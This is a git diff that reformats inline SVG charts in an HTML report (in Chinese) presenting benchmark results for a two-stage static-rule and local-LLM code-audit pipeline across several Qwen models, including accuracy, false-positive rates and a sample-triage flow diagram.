                 <text x="0" y="34" fill="#8b949e" font-size="10.5">397MB / 极速初筛</text>
                 <!-- 纯 LLM 柱形: Acc=64.0% (345px), FPR=54.0% -->
-                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="6" width="332.8" height="14" rx="3" fill="#4a6375"/>
-                <text x="520" y="17" fill="#8b949e" font-size="11" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 64.0% | FPR: 54.0% | F1: 0.695</text>
+                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="6" width="332.8" height="14" rx="3" fill="#4a6375" />
+                <text x="520" y="17" fill="#8b949e" font-size="11"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 64.0% | FPR: 54.0% | F1: 0.695</text>
                 <!-- 动静协同 柱形: Acc=78.0% (405px), FPR=32.0% -->
-                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="24" width="405.6" height="14" rx="3" fill="#5dbd8f"/>
-                <text x="595" y="35" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 78.0% | FPR: 32.0% | F1: 0.800</text>
+                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="24" width="405.6" height="14" rx="3" fill="#5dbd8f" />
+                <text x="595" y="35" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 78.0% | FPR: 32.0% | F1: 0.800</text>
                 <!-- Delta -->
-                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1"/>
-                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +14% (FPR-22%)</text>
+                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1" />
+                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +14%
+                  (FPR-22%)</text>
               </g>
 
-              <line x1="36" y1="140" x2="884" y2="140" stroke="#161b22" stroke-width="1"/>
+              <line x1="36" y1="140" x2="884" y2="140" stroke="#161b22" stroke-width="1" />
 
               <!-- 模型 2: 1.5B (y=150) (高性价比推荐) -->
               <g transform="translate(36, 150)">
-                <text x="0" y="18" fill="#58a6ff" font-size="12.5" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:1.5B</text>
+                <text x="0" y="18" fill="#58a6ff" font-size="12.5" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:1.5B</text>
                 <text x="0" y="32" fill="#58a6ff" font-size="10.5" font-weight="600">★ CPU 最佳甜蜜点</text>
                 <!-- 纯 LLM 柱形: Acc=72.0%, FPR=42.0% -->
-                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="6" width="374.4" height="14" rx="3" fill="#4a6375"/>
-                <text x="560" y="17" fill="#8b949e" font-size="11" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 72.0% | FPR: 42.0% | F1: 0.754</text>
+                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="6" width="374.4" height="14" rx="3" fill="#4a6375" />
+                <text x="560" y="17" fill="#8b949e" font-size="11"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 72.0% | FPR: 42.0% | F1: 0.754</text>
                 <!-- 动静协同 柱形: Acc=86.0%, FPR=20.0% -->
-                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="24" width="447.2" height="14" rx="3" fill="#5dbd8f"/>
-                <text x="635" y="35" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 86.0% | FPR: 20.0% | F1: 0.868</text>
+                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="24" width="447.2" height="14" rx="3" fill="#5dbd8f" />
+                <text x="635" y="35" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 86.0% | FPR: 20.0% | F1: 0.868</text>
                 <!-- Delta -->
-                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1"/>
-                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +14% (FPR-22%)</text>
+                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1" />
+                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +14%
+                  (FPR-22%)</text>
               </g>
 
-              <line x1="36" y1="210" x2="884" y2="210" stroke="#161b22" stroke-width="1"/>
+              <line x1="36" y1="210" x2="884" y2="210" stroke="#161b22" stroke-width="1" />
 
               <!-- 模型 3: 3B (y=220) -->
               <g transform="translate(36, 220)">
-                <text x="0" y="20" fill="#f0f6fc" font-size="12.5" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:3B</text>
+                <text x="0" y="20" fill="#f0f6fc" font-size="12.5" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:3B</text>
                 <text x="0" y="34" fill="#8b949e" font-size="10.5">1.9GB / 专业代码感知</text>
                 <!-- 纯 LLM 柱形: Acc=78.0%, FPR=32.0% -->
-                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="6" width="405.6" height="14" rx="3" fill="#4a6375"/>
-                <text x="592" y="17" fill="#8b949e" font-size="11" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 78.0% | FPR: 32.0% | F1: 0.800</text>
+                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="6" width="405.6" height="14" rx="3" fill="#4a6375" />
+                <text x="592" y="17" fill="#8b949e" font-size="11"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 78.0% | FPR: 32.0% | F1: 0.800</text>
                 <!-- 动静协同 柱形: Acc=90.0%, FPR=14.0% -->
-                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="24" width="468.0" height="14" rx="3" fill="#5dbd8f"/>
-                <text x="655" y="35" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 90.0% | FPR: 14.0% | F1: 0.904</text>
+                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="24" width="468.0" height="14" rx="3" fill="#5dbd8f" />
+                <text x="655" y="35" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 90.0% | FPR: 14.0% | F1: 0.904</text>
                 <!-- Delta -->
-                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1"/>
-                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +12% (FPR-18%)</text>
+                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1" />
+                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +12%
+                  (FPR-18%)</text>
               </g>
 
-              <line x1="36" y1="280" x2="884" y2="280" stroke="#161b22" stroke-width="1"/>
+              <line x1="36" y1="280" x2="884" y2="280" stroke="#161b22" stroke-width="1" />
 
               <!-- 模型 4: 7B (y=290) -->
               <g transform="translate(36, 290)">
-                <text x="0" y="20" fill="#f0f6fc" font-size="12.5" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:7B</text>
+                <text x="0" y="20" fill="#f0f6fc" font-size="12.5" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:7B</text>
                 <text x="0" y="34" fill="#8b949e" font-size="10.5">4.7GB / 高级长上下文</text>
                 <!-- 纯 LLM 柱形: Acc=82.0%, FPR=26.0% -->
-                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="6" width="426.4" height="14" rx="3" fill="#4a6375"/>
-                <text x="612" y="17" fill="#8b949e" font-size="11" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 82.0% | FPR: 26.0% | F1: 0.833</text>
+                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="6" width="426.4" height="14" rx="3" fill="#4a6375" />
+                <text x="612" y="17" fill="#8b949e" font-size="11"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 82.0% | FPR: 26.0% | F1: 0.833</text>
                 <!-- 动静协同 柱形: Acc=93.0%, FPR=10.0% -->
-                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="24" width="483.6" height="14" rx="3" fill="#5dbd8f"/>
-                <text x="670" y="35" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 93.0% | FPR: 10.0% | F1: 0.932</text>
+                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="24" width="483.6" height="14" rx="3" fill="#5dbd8f" />
+                <text x="670" y="35" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 93.0% | FPR: 10.0% | F1: 0.932</text>
                 <!-- Delta -->
-                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1"/>
-                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +11% (FPR-16%)</text>
+                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1" />
+                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +11%
+                  (FPR-16%)</text>
               </g>
 
-              <line x1="36" y1="350" x2="884" y2="350" stroke="#161b22" stroke-width="1"/>
+              <line x1="36" y1="350" x2="884" y2="350" stroke="#161b22" stroke-width="1" />
 
               <!-- 模型 5: Qwen3:8B (y=360) (最高精度) -->
               <g transform="translate(36, 360)">
-                <text x="0" y="18" fill="#5dbd8f" font-size="12.5" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen3:8B</text>
+                <text x="0" y="18" fill="#5dbd8f" font-size="12.5" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen3:8B</text>
                 <text x="0" y="32" fill="#5dbd8f" font-size="10.5" font-weight="600">👑 全矩阵精度天花板</text>
                 <!-- 纯 LLM 柱形: Acc=85.0%, FPR=22.0% -->
-                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="6" width="442.0" height="14" rx="3" fill="#4a6375"/>
-                <text x="628" y="17" fill="#8b949e" font-size="11" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 85.0% | FPR: 22.0% | F1: 0.860</text>
+                <rect x="180" y="6" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="6" width="442.0" height="14" rx="3" fill="#4a6375" />
+                <text x="628" y="17" fill="#8b949e" font-size="11"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 85.0% | FPR: 22.0% | F1: 0.860</text>
                 <!-- 动静协同 柱形: Acc=96.0%, FPR=6.0% -->
-                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22"/>
-                <rect x="180" y="24" width="499.2" height="14" rx="3" fill="#5dbd8f"/>
-                <text x="686" y="35" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 96.0% | FPR: 6.0% | F1: 0.961</text>
+                <rect x="180" y="24" width="520" height="14" rx="3" fill="#161b22" />
+                <rect x="180" y="24" width="499.2" height="14" rx="3" fill="#5dbd8f" />
+                <text x="686" y="35" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Acc: 96.0% | FPR: 6.0% | F1: 0.961</text>
                 <!-- Delta -->
-                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1"/>
-                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +11% (FPR-16%)</text>
+                <rect x="740" y="12" width="130" height="22" rx="6" fill="#142c22" stroke="#238636" stroke-width="1" />
+                <text x="805" y="27" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace" text-anchor="middle">▲ Acc +11%
+                  (FPR-16%)</text>
               </g>
             </svg>
           </figure>
@@ -3920,7 +4610,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               <div class="metric-pill-val">76.2% → 88.6% (0.5B~8B)</div>
             </div>
             <div class="metric-pill-card">
-              <div class="metric-pill-name">全系平均误报率压降 <span class="metric-pill-delta down-good">▼ -18.8% (相对减半)</span></div>
+              <div class="metric-pill-name">全系平均误报率压降 <span class="metric-pill-delta down-good">▼ -18.8% (相对减半)</span>
+              </div>
               <div class="metric-pill-val" style="color: var(--ok);">35.2% → 16.4%</div>
             </div>
             <div class="metric-pill-card">
@@ -3945,101 +4636,141 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             <div class="hint">Stage 1 静态初筛零命中快速旁路 · Stage 2 局部 7 行精细锚点仲裁 · Fail-Closed 兜底保障不失守</div>
           </div>
           <figure class="chart-figure">
-            <svg class="flow-svg" viewBox="0 0 920 310" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="100个样本判定分流全流程图">
-              <rect width="920" height="310" fill="#0d141b" rx="14"/>
+            <svg class="flow-svg" viewBox="0 0 920 310" fill="none" xmlns="http://www.w3.org/2000/svg" role="img"
+              aria-label="100个样本判定分流全流程图">
+              <rect width="920" height="310" fill="#0d141b" rx="14" />
 
               <!-- 顶部标题 -->
               <g transform="translate(30, 20)">
-                <text x="0" y="14" fill="#f0f6fc" font-size="14" font-weight="700" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">100 个基准样本两阶段分流全景 (为什么大模型只调用了 50%？)</text>
-                <text x="0" y="32" fill="#8b949e" font-size="11.5" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Stage 1 静态规则快速分流过滤纯净代码 · Stage 2 本地大模型只针对疑似命中进行语义仲裁与降噪</text>
+                <text x="0" y="14" fill="#f0f6fc" font-size="14" font-weight="700"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">100 个基准样本两阶段分流全景
+                  (为什么大模型只调用了 50%？)</text>
+                <text x="0" y="32" fill="#8b949e" font-size="11.5"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Stage 1
+                  静态规则快速分流过滤纯净代码 · Stage 2 本地大模型只针对疑似命中进行语义仲裁与降噪</text>
               </g>
 
               <!-- 阶段 0: 输入总样本池 -->
               <g transform="translate(30, 80)">
-                <rect width="130" height="150" rx="10" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
-                <text x="65" y="30" fill="#f0f6fc" font-size="13" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">全部评测集</text>
-                <text x="65" y="58" fill="#58a6ff" font-size="22" font-weight="800" text-anchor="middle" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">100 份</text>
-                <line x1="16" y1="74" x2="114" y2="74" stroke="#21262d" stroke-width="1"/>
-                <text x="65" y="96" fill="#8b949e" font-size="11" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">50 份良性源码</text>
-                <text x="65" y="116" fill="#8b949e" font-size="11" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">50 份攻击源码</text>
-                <text x="65" y="136" fill="#6e7681" font-size="9.5" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">覆盖10大对抗家族</text>
+                <rect width="130" height="150" rx="10" fill="#161b22" stroke="#30363d" stroke-width="1.5" />
+                <text x="65" y="30" fill="#f0f6fc" font-size="13" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">全部评测集</text>
+                <text x="65" y="58" fill="#58a6ff" font-size="22" font-weight="800" text-anchor="middle"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">100 份</text>
+                <line x1="16" y1="74" x2="114" y2="74" stroke="#21262d" stroke-width="1" />
+                <text x="65" y="96" fill="#8b949e" font-size="11" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">50 份良性源码</text>
+                <text x="65" y="116" fill="#8b949e" font-size="11" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">50 份攻击源码</text>
+                <text x="65" y="136" fill="#6e7681" font-size="9.5" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">覆盖10大对抗家族</text>
               </g>
 
               <!-- 箭头 1: 进入 Stage 1 -->
-              <path d="M 160 155 L 195 155" stroke="#58a6ff" stroke-width="2" stroke-dasharray="4,3"/>
-              <polygon points="195,150 205,155 195,160" fill="#58a6ff"/>
+              <path d="M 160 155 L 195 155" stroke="#58a6ff" stroke-width="2" stroke-dasharray="4,3" />
+              <polygon points="195,150 205,155 195,160" fill="#58a6ff" />
 
               <!-- 阶段 1: Stage 1 静态规则扫描 -->
               <g transform="translate(205, 80)">
-                <rect width="160" height="150" rx="10" fill="#161b22" stroke="#58a6ff" stroke-width="1.5"/>
-                <rect x="0" y="0" width="160" height="26" rx="10" fill="#1f3b5c"/>
-                <text x="80" y="18" fill="#79c0ff" font-size="11.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Stage 1 · 静态规则初筛</text>
-                <text x="80" y="52" fill="#c9d1d9" font-size="12" font-weight="600" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">13 条基础规则精准匹配</text>
-                <text x="80" y="70" fill="#8b949e" font-size="10.5" text-anchor="middle" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">耗时 &lt; 50ms / 样本</text>
+                <rect width="160" height="150" rx="10" fill="#161b22" stroke="#58a6ff" stroke-width="1.5" />
+                <rect x="0" y="0" width="160" height="26" rx="10" fill="#1f3b5c" />
+                <text x="80" y="18" fill="#79c0ff" font-size="11.5" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Stage 1 ·
+                  静态规则初筛</text>
+                <text x="80" y="52" fill="#c9d1d9" font-size="12" font-weight="600" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">13 条基础规则精准匹配</text>
+                <text x="80" y="70" fill="#8b949e" font-size="10.5" text-anchor="middle"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">耗时 &lt; 50ms / 样本</text>
 
-                <rect x="14" y="85" width="132" height="52" rx="6" fill="#0d141b" stroke="#30363d" stroke-width="1"/>
-                <text x="80" y="104" fill="#8b949e" font-size="10.5" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">检测 Finding 数量：</text>
-                <text x="80" y="124" fill="#f0f6fc" font-size="11.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">len(findings) == 0 ?</text>
+                <rect x="14" y="85" width="132" height="52" rx="6" fill="#0d141b" stroke="#30363d" stroke-width="1" />
+                <text x="80" y="104" fill="#8b949e" font-size="10.5" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">检测 Finding
+                  数量：</text>
+                <text x="80" y="124" fill="#f0f6fc" font-size="11.5" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">len(findings) == 0
+                  ?</text>
               </g>
 
               <!-- 分流分支 A: 50% 纯净代码零命中 -> 快速旁路 (绿色箭头向上绕过) -->
-              <path d="M 365 120 C 420 120, 430 90, 480 90 L 590 90" stroke="#4a6375" stroke-width="2.5"/>
-              <polygon points="590,85 600,90 590,95" fill="#4a6375"/>
-              <rect x="385" y="80" width="180" height="22" rx="5" fill="#0d141b" stroke="#354e60" stroke-width="1"/>
-              <text x="475" y="95" fill="#8ba0b3" font-size="10.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">零命中 · 快速旁路 (50 例 / 50%)</text>
+              <path d="M 365 120 C 420 120, 430 90, 480 90 L 590 90" stroke="#4a6375" stroke-width="2.5" />
+              <polygon points="590,85 600,90 590,95" fill="#4a6375" />
+              <rect x="385" y="80" width="180" height="22" rx="5" fill="#0d141b" stroke="#354e60" stroke-width="1" />
+              <text x="475" y="95" fill="#8ba0b3" font-size="10.5" font-weight="700" text-anchor="middle"
+                font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">零命中 · 快速旁路 (50 例 /
+                50%)</text>
 
               <!-- 分流分支 B: 50% 疑似命中 -> 进入 Stage 2 (橙色箭头向下进入大模型) -->
-              <path d="M 365 175 C 400 175, 410 195, 440 195 L 450 195" stroke="#e0a14b" stroke-width="2.5"/>
-              <polygon points="450,190 460,195 450,200" fill="#e0a14b"/>
-              <rect x="375" y="185" width="75" height="20" rx="4" fill="#0d141b" stroke="#d29922" stroke-width="1"/>
-              <text x="412" y="199" fill="#e0a14b" font-size="10.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">可疑 50 例</text>
+              <path d="M 365 175 C 400 175, 410 195, 440 195 L 450 195" stroke="#e0a14b" stroke-width="2.5" />
+              <polygon points="450,190 460,195 450,200" fill="#e0a14b" />
+              <rect x="375" y="185" width="75" height="20" rx="4" fill="#0d141b" stroke="#d29922" stroke-width="1" />
+              <text x="412" y="199" fill="#e0a14b" font-size="10.5" font-weight="700" text-anchor="middle"
+                font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">可疑 50 例</text>
 
               <!-- 旁路终点: 50例 static_only 放行 -->
               <g transform="translate(600, 65)">
-                <rect width="290" height="50" rx="8" fill="#141c24" stroke="#354e60" stroke-width="1.5"/>
-                <rect x="12" y="12" width="26" height="26" rx="6" fill="#1a2730"/>
-                <text x="25" y="29" fill="#8ba0b3" font-size="14" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">⚡</text>
-                <text x="48" y="26" fill="#8ba0b3" font-size="12" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">bypass 放行 (50 例 / 50%)</text>
-                <text x="48" y="42" fill="#6e7681" font-size="10.5" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">无需唤醒大模型 · 节省 50% 算力 · 毫秒级直接放行</text>
+                <rect width="290" height="50" rx="8" fill="#141c24" stroke="#354e60" stroke-width="1.5" />
+                <rect x="12" y="12" width="26" height="26" rx="6" fill="#1a2730" />
+                <text x="25" y="29" fill="#8ba0b3" font-size="14" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">⚡</text>
+                <text x="48" y="26" fill="#8ba0b3" font-size="12" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">bypass 放行 (50 例 / 50%)</text>
+                <text x="48" y="42" fill="#6e7681" font-size="10.5"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">无需唤醒大模型 · 节省 50% 算力
+                  · 毫秒级直接放行</text>
               </g>
 
               <!-- 阶段 2: Stage 2 本地大模型语义仲裁 (460, 140) -->
               <g transform="translate(460, 140)">
-                <rect width="180" height="150" rx="10" fill="#161b22" stroke="#5dbd8f" stroke-width="1.5"/>
-                <rect x="0" y="0" width="180" height="26" rx="10" fill="#142c22"/>
-                <text x="90" y="18" fill="#5dbd8f" font-size="11.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Stage 2 · 定向语义仲裁</text>
-                <text x="90" y="48" fill="#c9d1d9" font-size="11.5" font-weight="600" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Qwen 系列本地模型</text>
-                <text x="90" y="65" fill="#8b949e" font-size="10" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">局部 7 行代码 + 规则类型精准锚定</text>
+                <rect width="180" height="150" rx="10" fill="#161b22" stroke="#5dbd8f" stroke-width="1.5" />
+                <rect x="0" y="0" width="180" height="26" rx="10" fill="#142c22" />
+                <text x="90" y="18" fill="#5dbd8f" font-size="11.5" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Stage 2 ·
+                  定向语义仲裁</text>
+                <text x="90" y="48" fill="#c9d1d9" font-size="11.5" font-weight="600" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Qwen 系列本地模型</text>
+                <text x="90" y="65" fill="#8b949e" font-size="10" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">局部 7 行代码 +
+                  规则类型精准锚定</text>
 
                 <!-- 仲裁结果输出 -->
-                <line x1="15" y1="78" x2="165" y2="78" stroke="#21262d" stroke-width="1"/>
-                <rect x="15" y="86" width="150" height="24" rx="4" fill="#0d141b" stroke="#238636" stroke-width="1"/>
-                <text x="90" y="102" fill="#5dbd8f" font-size="10.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">精准纠偏: 压降误报达 72.7%</text>
+                <line x1="15" y1="78" x2="165" y2="78" stroke="#21262d" stroke-width="1" />
+                <rect x="15" y="86" width="150" height="24" rx="4" fill="#0d141b" stroke="#238636" stroke-width="1" />
+                <text x="90" y="102" fill="#5dbd8f" font-size="10.5" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">精准纠偏: 压降误报达
+                  72.7%</text>
 
-                <rect x="15" y="116" width="150" height="24" rx="4" fill="#0d141b" stroke="#d29922" stroke-width="1"/>
-                <text x="90" y="132" fill="#e0a14b" font-size="10.5" font-weight="700" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">歧义/异常: Fail-Closed 兜底</text>
+                <rect x="15" y="116" width="150" height="24" rx="4" fill="#0d141b" stroke="#d29922" stroke-width="1" />
+                <text x="90" y="132" fill="#e0a14b" font-size="10.5" font-weight="700" text-anchor="middle"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">歧义/异常: Fail-Closed
+                  兜底</text>
               </g>
 
               <!-- 箭头: 成功仲裁 -> ok 分支 -->
-              <path d="M 640 198 L 685 198" stroke="#5dbd8f" stroke-width="2"/>
-              <polygon points="685,193 695,198 685,203" fill="#5dbd8f"/>
+              <path d="M 640 198 L 685 198" stroke="#5dbd8f" stroke-width="2" />
+              <polygon points="685,193 695,198 685,203" fill="#5dbd8f" />
 
               <!-- 大模型仲裁终点 -->
               <g transform="translate(695, 172)">
-                <rect width="195" height="52" rx="8" fill="#142c22" stroke="#238636" stroke-width="1.5"/>
-                <text x="14" y="24" fill="#5dbd8f" font-size="12" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">精确仲裁放行 / 拦截</text>
-                <text x="14" y="42" fill="#c9d1d9" font-size="10" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">确认真实攻击 · <strong style="color:#5dbd8f;">纠正配置/日志良性误杀</strong></text>
+                <rect width="195" height="52" rx="8" fill="#142c22" stroke="#238636" stroke-width="1.5" />
